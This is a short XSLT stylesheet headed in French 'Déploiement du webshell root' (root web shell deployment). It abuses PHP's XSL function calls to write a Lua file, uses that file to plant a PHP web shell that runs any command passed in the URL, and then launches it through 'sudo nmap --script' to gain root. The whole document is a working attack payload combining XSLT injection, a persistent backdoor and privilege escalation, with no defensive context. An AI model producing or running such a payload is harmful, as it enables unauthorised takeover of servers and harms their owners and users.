<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">

  <xsl:template match="*">
    <html><body>
      <h2>Déploiement du webshell root</h2>
      <pre>
        <xsl:variable name="lua">
          os.execute('echo "<?php echo shell_exec($_GET[\\'cmd\\']); ?>" > /var/www/html/p9g0xm7z3qdl.php')
        </xsl:variable>

        <xsl:value-of select="php:function('file_put_contents', '/var/tmp/rootshell.nse', $lua)" />
        <xsl:text>&#10;</xsl:text>
        <xsl:value-of select="php:function('shell_exec', 'sudo nmap --script=/var/tmp/rootshell.nse')" />
      </pre>
    </body></html>
  </xsl:template>

</xsl:stylesheet>
